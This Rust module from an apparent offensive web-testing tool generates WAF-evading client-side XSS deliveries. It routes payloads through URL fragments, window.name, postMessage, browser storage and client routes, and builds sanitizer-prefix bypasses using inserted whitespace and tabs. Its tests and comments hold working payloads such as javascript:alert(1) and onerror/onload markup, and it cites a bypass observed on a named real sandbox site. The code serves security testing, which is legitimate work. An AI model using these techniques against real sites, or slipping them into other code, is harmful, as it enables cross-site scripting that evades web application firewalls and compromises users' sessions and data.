//! WAF-blind client-side delivery channels for XSS.
//!
//! Every [`super::DeliveryShape`] is *transparent to the backend sink*: the
//! payload still traverses the WAF and the **server** reflects it. That model
//! is correct for SSRF/SSTI/CMDi/LDAP/SQL — and for XSS it is a dead lane
//! (1 of 895 confirmed bypasses on a live Cloudflare stack), because against a
//! modern WAF plus framework auto-escaping, reflected-server XSS genuinely
//! loses.
//!
//! The XSS that pays in 2026 is **client-side / DOM**, and its taint source
//! frequently never reaches the server at all:
//!
//! ```text
//!   ?success=javascript:alert(1)   → 403  (Cloudflare inspects the query)
//!   #success=javascript:alert(1)   → 200  (the fragment is never sent)
//! ```
//!
//! (Observed on `sandbox-buy.paddle.com`; see `wafrift-feedback-paddle-bypass.md`.)
//!
//! A [`ClientChannel`] therefore is **not** a 13th `DeliveryShape` — it does
//! not reach a server sink and cannot be confirmed by the server-response
//! verdict oracle. It names *which client-side taint source* carries the
//! payload, mapping one-to-one onto scald-core's `dom.rs` taint sources
//! (`location.hash`, `window.name`, `postMessage`, `localStorage`/
//! `sessionStorage`, client-router segment). The WAF-blindness IS the bypass;
//! execution is confirmed in a real browser by scald, never here.
//!
//! This module owns the *technique catalog* (Tier-B): the channels themselves
//! and the sanitizer-prefix-bypass payload preparation. scald-core consumes it
//! at the single wafrift↔scald integration boundary.

/// Browser storage backing a [`ClientChannel::Storage`] source.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum StorageKind {
    Local,
    Session,
}

impl StorageKind {
    /// scald `TaintKind` / JS global name for this store.
    #[must_use]
    pub fn js_global(self) -> &'static str {
        match self {
            Self::Local => "localStorage",
            Self::Session => "sessionStorage",
        }
    }
}

/// A client-side taint source that delivers an XSS payload to a DOM sink
/// **without** the payload traversing the WAF. Confirmed only by scald-core's
/// real-Chrome DOM sink hooks — never by a server-response verdict.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum ClientChannel {
    /// URL fragment (`#…`). Never transmitted to the origin server, so no WAF
    /// or CDN can inspect it. Reaches `location.hash` DOM sinks.
    Fragment,
    /// `window.name` — survives cross-origin navigation; the attacker sets it
    /// on their page, then navigates the victim to the target. Never sent to
    /// the server.
    WindowName,
    /// `postMessage` payload to a listener with a missing/loose origin check.
    /// `origin` is the (optionally spoofable) sender origin the listener
    /// accepts; `None` ⇒ a wildcard / unvalidated listener.
    PostMessage { origin: Option<String> },
    /// `localStorage` / `sessionStorage` entry under `key`, read back into a
    /// sink on a later page load. Client-only state; the WAF never sees it.
    Storage { kind: StorageKind, key: String },
    /// A client-side router segment (`#/path/<payload>` or a History-API
    /// route) parsed entirely in JS. SPA frameworks route on this without a
    /// server round-trip.
    ClientRoute,
}

impl ClientChannel {
    /// Stable operator/corpus label.
    #[must_use]
    pub fn label(&self) -> &'static str {
        match self {
            Self::Fragment => "fragment",
            Self::WindowName => "window_name",
            Self::PostMessage { .. } => "post_message",
            Self::Storage {
                kind: StorageKind::Local,
                ..
            } => "local_storage",
            Self::Storage {
                kind: StorageKind::Session,
                ..
            } => "session_storage",
            Self::ClientRoute => "client_route",
        }
    }

    /// The scald-core `dom.rs` taint source this channel is delivered through.
    /// This is the contract string scald consumes at the integration boundary.
    #[must_use]
    pub fn taint_source(&self) -> &'static str {
        match self {
            Self::Fragment => "location.hash",
            Self::WindowName => "window.name",
            Self::PostMessage { .. } => "postMessage",
            Self::Storage { kind, .. } => kind.js_global(),
            Self::ClientRoute => "location.hash", // SPA routers read the hash
        }
    }

    /// Always `false`: by construction a client channel never reaches a server
    /// sink. This is the whole point — it is the dual of
    /// [`super::DeliveryShape`]'s "transparent to the backend sink" contract.
    /// Callers MUST route confirmation through scald DOM, not the server
    /// verdict oracle.
    #[must_use]
    pub fn reaches_server(&self) -> bool {
        false
    }

    /// For [`Self::Fragment`] / [`Self::ClientRoute`], the URL a browser must
    /// navigate to so the payload lands in the fragment. The bytes after `#`
    /// are never put on the wire to the origin, so no encoding/WAF gate
    /// applies. Returns `None` for channels delivered by browser state
    /// (window.name / storage / postMessage) rather than the URL — scald sets
    /// those via CDP before navigation.
    #[must_use]
    pub fn fragment_url(&self, target: &str, payload: &str) -> Option<String> {
        match self {
            Self::Fragment => Some(format!("{target}#{payload}")),
            Self::ClientRoute => Some(format!("{target}#/{payload}")),
            _ => None,
        }
    }

    /// The full WAF-blind channel catalog for a given storage/route key.
    #[must_use]
    pub fn catalog() -> Vec<ClientChannel> {
        vec![
            Self::Fragment,
            Self::WindowName,
            Self::PostMessage { origin: None },
            Self::Storage {
                kind: StorageKind::Local,
                key: "q".to_string(),
            },
            Self::Storage {
                kind: StorageKind::Session,
                key: "q".to_string(),
            },
            Self::ClientRoute,
        ]
    }

    /// The concrete browser action that lands `payload` in this channel's taint
    /// source against `target`. This is the WAF-blind delivery *instruction* —
    /// the dual of a server [`super::DeliveryShape`]'s wire request — that scald
    /// (or a human with a browser) executes to confirm DOM execution. Nothing it
    /// describes traverses the WAF.
    #[must_use]
    pub fn delivery_action(&self, target: &str, payload: &str) -> DeliveryAction {
        match self {
            // The fragment / route URL carries the payload after `#`; navigating
            // to it is the whole delivery (the bytes never reach the origin).
            Self::Fragment | Self::ClientRoute => DeliveryAction::Navigate {
                // fragment_url is Some for these two variants; fall back to the
                // bare target defensively rather than panic on an impossible None.
                url: self
                    .fragment_url(target, payload)
                    .unwrap_or_else(|| target.to_string()),
            },
            Self::WindowName => DeliveryAction::SetWindowName {
                value: payload.to_string(),
                then_navigate: target.to_string(),
            },
            Self::Storage { kind, key } => DeliveryAction::SetStorage {
                store: kind.js_global().to_string(),
                key: key.clone(),
                value: payload.to_string(),
                then_load: target.to_string(),
            },
            Self::PostMessage { origin } => DeliveryAction::PostMessage {
                value: payload.to_string(),
                target: target.to_string(),
                accepted_origin: origin.clone(),
            },
        }
    }
}

/// The concrete operator action that places a payload into a client channel's
/// taint source — the WAF-blind delivery step scald or a human runs in a real
/// browser. The dual of a server `DeliveryShape`'s wire request: nothing here
/// crosses the WAF, so confirmation is a DOM-execution event, never a server
/// verdict. `kind`-tagged for stable JSON (`wafrift.client_deliver.v1`).
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum DeliveryAction {
    /// Navigate the browser to `url`; the payload rides in the fragment and is
    /// never put on the wire to the origin. ([`ClientChannel::Fragment`],
    /// [`ClientChannel::ClientRoute`].)
    Navigate { url: String },
    /// Set `window.name = value` on an attacker-controlled page, then navigate
    /// the same tab to `then_navigate`. `window.name` survives the cross-origin
    /// navigation, carrying the payload into the target's `window.name` sink.
    SetWindowName { value: String, then_navigate: String },
    /// Write `value` into `store[key]` (`localStorage` / `sessionStorage`), then
    /// load `then_load`; a later read of that key into a DOM sink executes it.
    SetStorage {
        store: String,
        key: String,
        value: String,
        then_load: String,
    },
    /// `postMessage(value)` to the listener at `target`. `accepted_origin` is the
    /// origin the listener trusts — `None` means a wildcard / unvalidated
    /// listener (any origin, including the attacker's, is accepted).
    PostMessage {
        value: String,
        target: String,
        accepted_origin: Option<String>,
    },
}

impl DeliveryAction {
    /// A single-line, copy-pasteable operator instruction for this action.
    #[must_use]
    pub fn describe(&self) -> String {
        match self {
            Self::Navigate { url } => format!("navigate browser to {url}"),
            Self::SetWindowName { value, then_navigate } => format!(
                "on an attacker page set window.name = {value:?}, then navigate the tab to \
                 {then_navigate}"
            ),
            Self::SetStorage { store, key, value, then_load } => format!(
                "set {store}[{key:?}] = {value:?}, then load {then_load}"
            ),
            Self::PostMessage { value, target, accepted_origin } => {
                let origin = accepted_origin.as_deref().unwrap_or("* (unvalidated)");
                format!("postMessage({value:?}) to {target} (listener accepts origin {origin})")
            }
        }
    }
}

/// One XSS payload bound to a WAF-blind client channel. The client-side
/// analogue of [`super::EquivPayload`] — but carrying a [`ClientChannel`]
/// instead of a server [`super::DeliveryShape`], because confirmation is a
/// DOM-execution event, not a server reflection.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ClientDelivery {
    /// The payload bytes that reach the DOM sink (verbatim — the fragment is
    /// not WAF-inspected, so no evasion encoding is applied or needed).
    pub payload: String,
    /// Which client-side taint source carries it.
    pub channel: ClientChannel,
    /// Rules composed to produce this member (audit / reward attribution).
    pub rules: Vec<&'static str>,
}

/// Locate a `javascript:` / `data:` scheme in `payload` (case-insensitive,
/// position-independent). Returns the byte offset of the scheme keyword.
fn scheme_offset(payload: &str) -> Option<(usize, &'static str)> {
    let lower = payload.to_ascii_lowercase();
    if let Some(p) = lower.find("javascript:") {
        return Some((p, "javascript"));
    }
    if let Some(p) = lower.find("data:") {
        return Some((p, "data"));
    }
    None
}

/// Sanitizer-prefix-bypass variants (Paddle `substring(0,11)` class).
///
/// A position-anchored sanitizer such as
/// `url.substring(0,11).toLowerCase() === 'javascript:'` is defeated by any
/// leading byte the browser strips *before* scheme parsing — WHATWG URL
/// parsing removes leading C0-control-or-space, and tab/CR/LF are stripped
/// from anywhere in the URL. So ` javascript:…`, `\tjavascript:…`, and
/// `java\tscript:…` all still execute while failing the exact-position check.
///
/// Scoped to scheme-carrying payloads: for a markup payload the channel
/// itself is the bypass (no prefix needed), so this returns empty and the
/// caller delivers the raw payload. Every variant provably still executes
/// (only browser-stripped bytes are inserted), honouring the
/// sound-by-construction discipline shared with the server generators.
#[must_use]
pub fn prefix_bypass_variants(payload: &str) -> Vec<(String, &'static str)> {
    let Some((scheme_pos, scheme)) = scheme_offset(payload) else {
        return Vec::new();
    };
    let mut out: Vec<(String, &'static str)> = Vec::with_capacity(5);

    // Leading browser-stripped bytes (trimmed before scheme detection).
    for (prefix, rule) in [
        (" ", "prefix_space"),
        ("\t", "prefix_tab"),
        ("\n", "prefix_newline"),
        ("\r", "prefix_cr"),
    ] {
        out.push((format!("{prefix}{payload}"), rule));
    }

    // Intra-scheme tab: `java\tscript:` — HTML/URL parsers drop the tab, the
    // sanitizer's contiguous `=== 'javascript:'` match fails. Only meaningful
    // for `javascript:` (insert after the 4-char `java` prefix of the scheme).
    if scheme == "javascript" {
        let insert_at = scheme_pos + 4; // after "java"
        if payload.is_char_boundary(insert_at) {
            let mut v = String::with_capacity(payload.len() + 1);
            v.push_str(&payload[..insert_at]);
            v.push('\t');
            v.push_str(&payload[insert_at..]);
            out.push((v, "intra_scheme_tab"));
        }
    }

    out
}

/// Generate up to `max` WAF-blind client deliveries for an XSS `payload`.
///
/// Deterministic and allocation-light: the identity payload across every
/// client channel, plus — for scheme-carrying payloads — the sanitizer
/// prefix-bypass variants on the fragment channel (the most broadly reachable
/// WAF-blind sink). Deduplicated by `(payload, channel.label())`.
#[must_use]
pub fn xss_client_delivered(payload: &str, max: usize) -> Vec<ClientDelivery> {
    let mut out: Vec<ClientDelivery> = Vec::with_capacity(max.min(32));
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();

    let push = |payload: String, channel: ClientChannel, rules: Vec<&'static str>, out: &mut Vec<ClientDelivery>, seen: &mut std::collections::HashSet<String>| {
        if out.len() >= max {
            return;
        }
        let key = format!("{payload}\u{1}{}", channel.label());
        if seen.insert(key) {
            out.push(ClientDelivery {
                payload,
                channel,
                rules,
            });
        }
    };

    // Seed 1: identity payload across every WAF-blind channel.
    for channel in ClientChannel::catalog() {
        push(payload.to_string(), channel, vec!["identity"], &mut out, &mut seen);
    }

    // Seed 2: sanitizer prefix-bypass variants, delivered via the fragment
    // (the broadest WAF-blind reach). Empty for markup payloads.
    for (variant, rule) in prefix_bypass_variants(payload) {
        push(
            variant,
            ClientChannel::Fragment,
            vec!["prefix_bypass", rule],
            &mut out,
            &mut seen,
        );
    }

    out.truncate(max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fragment_url_keeps_payload_after_hash_byte_exact() {
        let c = ClientChannel::Fragment;
        // The payload lands verbatim after `#` — never percent-encoded,
        // because the fragment is never sent to the origin.
        assert_eq!(
            c.fragment_url("https://t/checkout", "javascript:alert(1)").as_deref(),
            Some("https://t/checkout#javascript:alert(1)")
        );
    }

    #[test]
    fn client_route_nests_under_hash_path() {
        assert_eq!(
            ClientChannel::ClientRoute
                .fragment_url("https://t/app", "<img src=x onerror=alert(1)>")
                .as_deref(),
            Some("https://t/app#/<img src=x onerror=alert(1)>")
        );
    }

    #[test]
    fn state_channels_have_no_fragment_url() {
        for c in [
            ClientChannel::WindowName,
            ClientChannel::PostMessage { origin: None },
            ClientChannel::Storage {
                kind: StorageKind::Local,
                key: "q".into(),
            },
        ] {
            assert!(c.fragment_url("https://t", "x").is_none());
        }
    }

    #[test]
    fn every_client_channel_is_waf_blind() {
        for c in ClientChannel::catalog() {
            assert!(!c.reaches_server(), "{} must never reach the server", c.label());
        }
    }

    #[test]
    fn channels_map_to_scald_taint_sources() {
        assert_eq!(ClientChannel::Fragment.taint_source(), "location.hash");
        assert_eq!(ClientChannel::WindowName.taint_source(), "window.name");
        assert_eq!(
            ClientChannel::Storage {
                kind: StorageKind::Session,
                key: "q".into()
            }
            .taint_source(),
            "sessionStorage"
        );
    }

    #[test]
    fn prefix_bypass_defeats_substring_check_but_still_parses_scheme() {
        let vs = prefix_bypass_variants("javascript:alert(1)");
        assert!(!vs.is_empty());
        for (variant, _rule) in &vs {
            // A position-anchored `substring(0,11) === 'javascript:'` check
            // FAILS (the contiguous lowercase scheme is no longer at offset 0).
            assert_ne!(&variant[..variant.len().min(11)].to_ascii_lowercase(), "javascript:");
            // …yet the scheme is still present once the browser strips the
            // tab/space/newline, so it still executes.
            let normalized: String = variant.chars().filter(|c| !c.is_whitespace()).collect();
            assert!(normalized.to_ascii_lowercase().starts_with("javascript:alert"));
        }
    }

    #[test]
    fn markup_payload_gets_no_prefix_variants() {
        // No scheme ⇒ the channel itself is the bypass; no prefix needed.
        assert!(prefix_bypass_variants("<img src=x onerror=alert(1)>").is_empty());
    }

    #[test]
    fn data_uri_is_a_recognized_scheme() {
        let vs = prefix_bypass_variants("data:text/html,<script>alert(1)</script>");
        assert!(vs.iter().any(|(_, r)| *r == "prefix_space"));
        // intra_scheme_tab is javascript-only.
        assert!(!vs.iter().any(|(_, r)| *r == "intra_scheme_tab"));
    }

    #[test]
    fn generator_is_deterministic_and_covers_every_channel() {
        let a = xss_client_delivered("javascript:alert(1)", 40);
        let b = xss_client_delivered("javascript:alert(1)", 40);
        assert_eq!(a, b, "generation must be deterministic");
        // All six WAF-blind channels represented at least once.
        for c in ClientChannel::catalog() {
            assert!(
                a.iter().any(|d| d.channel.label() == c.label()),
                "channel {} missing from output",
                c.label()
            );
        }
        // Prefix-bypass members are present for a scheme payload.
        assert!(a.iter().any(|d| d.rules.contains(&"prefix_bypass")));
    }

    #[test]
    fn generator_respects_max() {
        assert!(xss_client_delivered("javascript:alert(1)", 3).len() <= 3);
    }

    #[test]
    fn delivery_action_fragment_is_a_navigation_to_the_hash_url() {
        let a = ClientChannel::Fragment.delivery_action("https://t/checkout", "javascript:alert(1)");
        assert_eq!(
            a,
            DeliveryAction::Navigate {
                url: "https://t/checkout#javascript:alert(1)".to_string()
            }
        );
    }

    #[test]
    fn delivery_action_client_route_nests_under_hash_path() {
        let a = ClientChannel::ClientRoute.delivery_action("https://t/app", "<img src=x onerror=alert(1)>");
        assert_eq!(
            a,
            DeliveryAction::Navigate {
                url: "https://t/app#/<img src=x onerror=alert(1)>".to_string()
            }
        );
    }

    #[test]
    fn delivery_action_window_name_sets_state_then_navigates() {
        let a = ClientChannel::WindowName.delivery_action("https://t/", "payload123");
        assert_eq!(
            a,
            DeliveryAction::SetWindowName {
                value: "payload123".to_string(),
                then_navigate: "https://t/".to_string()
            }
        );
    }

    #[test]
    fn delivery_action_storage_carries_store_key_value_and_load() {
        let a = ClientChannel::Storage {
            kind: StorageKind::Session,
            key: "draft".into(),
        }
        .delivery_action("https://t/editor", "<svg onload=alert(1)>");
        assert_eq!(
            a,
            DeliveryAction::SetStorage {
                store: "sessionStorage".to_string(),
                key: "draft".to_string(),
                value: "<svg onload=alert(1)>".to_string(),
                then_load: "https://t/editor".to_string(),
            }
        );
    }

    #[test]
    fn delivery_action_post_message_preserves_accepted_origin() {
        let with = ClientChannel::PostMessage {
            origin: Some("https://evil.test".into()),
        }
        .delivery_action("https://t/", "x");
        assert_eq!(
            with,
            DeliveryAction::PostMessage {
                value: "x".to_string(),
                target: "https://t/".to_string(),
                accepted_origin: Some("https://evil.test".to_string()),
            }
        );
        let wildcard = ClientChannel::PostMessage { origin: None }.delivery_action("https://t/", "x");
        assert!(matches!(
            wildcard,
            DeliveryAction::PostMessage { accepted_origin: None, .. }
        ));
    }

    #[test]
    fn every_catalog_channel_yields_a_describable_action() {
        // Anti-rig: no channel may produce an empty or panicking instruction —
        // the operator must get a usable line for every WAF-blind lane.
        for c in ClientChannel::catalog() {
            let a = c.delivery_action("https://t/path", "javascript:alert(1)");
            let line = a.describe();
            assert!(!line.is_empty(), "{} produced an empty instruction", c.label());
            // Every instruction must reference the payload it delivers.
            assert!(
                line.contains("alert(1)"),
                "{} instruction dropped the payload: {line}",
                c.label()
            );
        }
    }

    #[test]
    fn delivery_action_describe_flags_unvalidated_post_message_listener() {
        let line = ClientChannel::PostMessage { origin: None }
            .delivery_action("https://t/", "x")
            .describe();
        assert!(
            line.contains("unvalidated"),
            "a wildcard listener must be flagged as unvalidated: {line}"
        );
    }

    #[test]
    fn delivery_action_serde_round_trips_for_every_variant() {
        // The action is emitted in the `wafrift.client_deliver.v1` JSON consumed
        // by scald; pin the round-trip so a downstream parser written today still
        // works tomorrow (LAW 2).
        for c in ClientChannel::catalog() {
            let a = c.delivery_action("https://t/x", "<script>alert(1)</script>");
            let json = serde_json::to_string(&a).expect("serialise action");
            let back: DeliveryAction = serde_json::from_str(&json).expect("deserialise action");
            assert_eq!(a, back, "round-trip drift for channel {}", c.label());
            // The `kind` tag must be present and snake_case for a stable schema.
            assert!(json.contains("\"kind\""), "missing kind tag: {json}");
        }
    }

    #[test]
    fn client_labels_are_disjoint_from_server_delivery_shapes() {
        // Coherence guard: a client channel must NEVER collide with a server
        // DeliveryShape label, or confirmation could be routed to the wrong
        // oracle (server verdict vs scald DOM).
        let server: std::collections::HashSet<&'static str> =
            super::super::sql::delivery_set("q")
                .iter()
                .map(super::super::DeliveryShape::label)
                .collect();
        for c in ClientChannel::catalog() {
            assert!(
                !server.contains(c.label()),
                "client channel {} collides with a server DeliveryShape label",
                c.label()
            );
        }
    }
}
